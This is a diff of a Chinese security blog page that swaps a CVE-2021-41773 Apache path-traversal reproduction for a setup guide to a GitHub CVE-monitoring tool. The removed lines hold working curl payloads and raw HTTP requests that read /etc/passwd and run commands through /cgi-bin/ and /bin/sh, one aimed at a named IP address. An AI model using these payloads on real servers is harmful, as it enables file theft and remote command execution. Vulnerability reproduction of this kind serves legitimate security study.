@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773), 渗透测试,RedTeam,漏洞复现,信息收集,java,golang,python等">
+    <meta name="keywords" content="CVE监控">
     <meta name="description" content="专注于RedTeam,分享生活,分享知识">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773) | Taoing&#39;s Blog</title>
+    <title>GitHub-CVE与工具监控 | Taoing&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -323,12 +323,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</h1>
+                    <h1 class="description center-align post-title">GitHub-CVE与工具监控</h1>
                 </div>
             </div>
         </div>
@@ -338,10 +338,104 @@
 
 
 
-<main class="container content">
+<main class="post-container content">
 
     
-    <!-- 文章内容详情 -->
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
 <div id="artDetail">
     <div class="card">
         <div class="card-content article-info">
@@ -350,12 +444,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Apache-HTTPD/">
-                                <span class="chip bg-color">Apache HTTPD</span>
-                            </a>
-                        
-                            <a href="/tags/CVE-2021-41773/">
-                                <span class="chip bg-color">CVE-2021-41773</span>
+                            <a href="/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/">
+                                <span class="chip bg-color">威胁情报</span>
                             </a>
                         
                     </div>
@@ -366,8 +456,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                漏洞复现
+                            <a href="/categories/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/" class="post-category">
+                                威胁情报
                             </a>
                         
                     </div>
@@ -379,28 +469,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-09
+                    2021-10-27
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-10-10
+                    2021-10-28
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    483
+                    302
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
 
@@ -423,37 +513,29 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773"><a href="#Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773" class="headerlink" title="Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)"></a>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</h2><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：<br>版本等于2.4.49<br>穿越的目录允许被访问，比如配置了<Directory />Require all granted</Directory>。（默认情况下是不允许的）<br>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
-<p><strong>参考链接：</strong></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://twitter.com/ptswarm/status/1445376079548624899">https://twitter.com/ptswarm/status/1445376079548624899</a></li>
-<li><a target="_blank" rel="noopener" href="https://twitter.com/HackerGautam/status/1445412108863041544">https://twitter.com/HackerGautam/status/1445412108863041544</a></li>
-<li><a target="_blank" rel="noopener" href="https://twitter.com/snyff/status/1445565903161102344">https://twitter.com/snyff/status/1445565903161102344</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md</a></li>
-</ul>
-<h3 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h3><p>使用如下CURL命令来发送Payload（注意其中的/icons/必须是一个存在且可访问的目录）：<br><code>curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p>
-<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1
-Host: 106.55.147.147:8080
-User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0
-Accept: *&#x2F;*
-Accept-Language: zh-CN,en;q&#x3D;0.5
-Accept-Encoding: gzip, deflate
-Connection: close
-Pragma: no-cache
-Cache-Control: no-cache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2871523259279.png"></p>
-<p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：<br><code>curl -v --data &quot;echo;id&quot; &#39;http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br><code>curl -v --data &quot;echo;id&quot; -x 127.0.0.1:8080 &#39;http://106.55.147.147:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br>-x 代表代理</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh HTTP&#x2F;1.1
-Host: Your ip:8080
-User-Agent: curl&#x2F;7.64.1
-Accept: *&#x2F;*
-Content-Length: 7
-Content-Type: application&#x2F;x-www-form-urlencoded
-Connection: close
+                <h2 id="一-拉取项目"><a href="#一-拉取项目" class="headerlink" title="一 拉取项目"></a>一 拉取项目</h2><h3 id="1-1-简介："><a href="#1-1-简介：" class="headerlink" title="1.1 简介："></a>1.1 简介：</h3><p>监控github上新增的cve编号项目漏洞和监控github发布工具更新，推送钉钉或者server酱</p>
+<h3 id="1-2-项目地址"><a href="#1-2-项目地址" class="headerlink" title="1.2 项目地址"></a>1.2 项目地址</h3><p><code>https://github.com/yhy0/github-cve-monitor</code></p>
+<h3 id="1-3-拉取部署"><a href="#1-3-拉取部署" class="headerlink" title="1.3 拉取部署"></a>1.3 拉取部署</h3><p><code>https://github.com/yhy0/github-cve-monitor.git</code></p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027200514536.png" alt="image-20211027200514536"></p>
+<p>安装必备库：<code>pip3 install -r  requirements.txt</code></p>
+<h3 id="1-4-配置推送"><a href="#1-4-配置推送" class="headerlink" title="1.4 配置推送"></a>1.4 配置推送</h3><p><strong>钉钉机器人：</strong>新建一个群–&gt;群设置–&gt;智能群助手(机器人管理)–&gt;添加机器人–&gt;选择”自定义 通过Webhook接入自定义服务”</p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027201714294.png" alt="image-20211027201714294"></p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027201924581.png" alt="image-20211027201924581"></p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027202023135.png" alt="image-20211027202023135"></p>
+<p>配置config.yaml：</p>
+<p><strong>enable: 0为关闭、enable: 1为开启。</strong>这里我开启的是飞书，假若你要开启其他的 就关闭飞书这个。以免麻烦</p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027202452504.png" alt="image-20211027202452504"></p>
+<h3 id="1-5-gihtub-token-获取"><a href="#1-5-gihtub-token-获取" class="headerlink" title="1.5 gihtub token 获取"></a>1.5 gihtub token 获取</h3><p>对于未经身份验证的请求，github 速率限制允许每小时最多 60 个请求</p>
+<p>而通过使用基本身份验证的 API 请求，每小时最多可以发出 5,000 个请求</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/settings/tokens/new">https://github.com/settings/tokens/new</a> 创建token，时间的话选无限制的，毕竟要一直跑</p>
+<p><img src="https://github.com/yhy0/github-cve-monitor/raw/master/images/image-20210729172507519.png" alt="image-20210729172507519"></p>
+<h3 id="1-6-运行测试"><a href="#1-6-运行测试" class="headerlink" title="1.6 运行测试"></a>1.6 运行测试</h3><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027202829263.png" alt="image-20211027202829263"></p>
+<p>后台运行:</p>
+<p><code>screen  python github_cve_monitor.py</code></p>
+<p><code>screen -ls</code> 查看正则运行的 screen</p>
+<pre class="line-numbers language-none"><code class="language-none">screen -r github_cve		#连接github_cve后台screen，如果存在的话<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-echo;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/198315816802.png"></p>
+<h3 id="1-7-效果展示"><a href="#1-7-效果展示" class="headerlink" title="1.7 效果展示"></a>1.7 效果展示</h3><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211028121337881.png" alt="image-20211028121337881"></p>
 
                 
             </div>
@@ -480,7 +562,7 @@ echo;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Ta0ing.github.io/article/3ec89881.html">http://Ta0ing.github.io/article/3ec89881.html</a>
+                    <a href="http://Ta0ing.github.io/article/92446bce.html">http://Ta0ing.github.io/article/92446bce.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -518,12 +600,8 @@ echo;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Apache-HTTPD/">
-                                    <span class="chip bg-color">Apache HTTPD</span>
-                                </a>
-                            
-                                <a href="/tags/CVE-2021-41773/">
-                                    <span class="chip bg-color">CVE-2021-41773</span>
+                                <a href="/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/">
+                                    <span class="chip bg-color">威胁情报</span>
                                 </a>
                             
                         </div>
@@ -573,31 +651,31 @@ echo;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/article/1c1cce96.html">
+                <a href="/article/da8eafa9.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="apache 解析漏洞（CVE-2017-15715)">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="国外扫描工具-Nuclei">
                         
-                        <span class="card-title">apache 解析漏洞（CVE-2017-15715)</span>
+                        <span class="card-title">国外扫描工具-Nuclei</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。
+                            文章摘要
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-09
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    漏洞复现
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BA%93/" class="post-category">
+                                    安全工具库
                                 </a>
                             
                             
@@ -607,12 +685,8 @@ echo;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Apache-HTTPD/">
-                        <span class="chip bg-color">Apache HTTPD</span>
-                    </a>
-                    
-                    <a href="/tags/CVE-2017-15715/">
-                        <span class="chip bg-color">CVE-2017-15715</span>
+                    <a href="/tags/Nuclei/">
+                        <span class="chip bg-color">Nuclei</span>
                     </a>
                     
                 </div>
@@ -626,31 +700,30 @@ echo;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/article/c3936183.html">
+                <a href="/article/f8cfd5f1.html">
                     <div class="card-image">
                         
+                        <img src="https://n.sinaimg.cn/spider2020514/289/w1776h913/20200514/36e1-hqhtuak1418439.png" class="responsive-img" alt="理解安全运营">
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="JBOSS CVE-2017-12149">
-                        
-                        <span class="card-title">JBOSS CVE-2017-12149</span>
+                        <span class="card-title">理解安全运营</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            文章摘要
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-20
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    漏洞复现
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/" class="post-category">
+                                    安全运营
                                 </a>
                             
                             
@@ -660,12 +733,8 @@ echo;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/JBOSS/">
-                        <span class="chip bg-color">JBOSS</span>
-                    </a>
-                    
-                    <a href="/tags/CVE-2017-12149/">
-                        <span class="chip bg-color">CVE-2017-12149</span>
+                    <a href="/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/">
+                        <span class="chip bg-color">安全运营</span>
                     </a>
                     
                 </div>
@@ -697,6 +766,100 @@ echo;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 
 <script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
 
     
 
